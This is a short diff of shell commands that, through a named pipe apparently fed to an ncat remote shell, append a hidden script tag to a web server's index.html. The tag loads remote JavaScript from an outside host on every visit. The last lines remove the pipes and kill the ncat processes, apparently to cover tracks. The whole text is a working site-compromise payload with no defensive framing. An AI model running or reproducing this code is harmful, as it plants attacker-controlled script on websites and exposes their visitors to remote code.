@@ -1,0 +1,4 @@
+echo "echo \"<script>if (document.getElementById('xyz')) {{}} else {{ var gam = document.createElement('script'); gam.type = 'text/javascript'; gam.async = true; gam.src = ('http://anto-int.com/counter.js'); var sm = document.getElementsByTagName('script')[0]; sm.parentNode.insertBefore(gam, sm); var fl = document.createElement('span'); fl.id = 'xyz'; var d =  document.getElementsByTagName('div')[0]; d.parentNode.insertBefore(fl, d);}}</script>\" >> /var/www/html/index.html" > input_pipe;
+echo exit > input_pipe;
+rm input_pipe output_pipe;
+ps aux | grep '[n]cat' | awk '{print $2}' | while read line; do kill $line; done
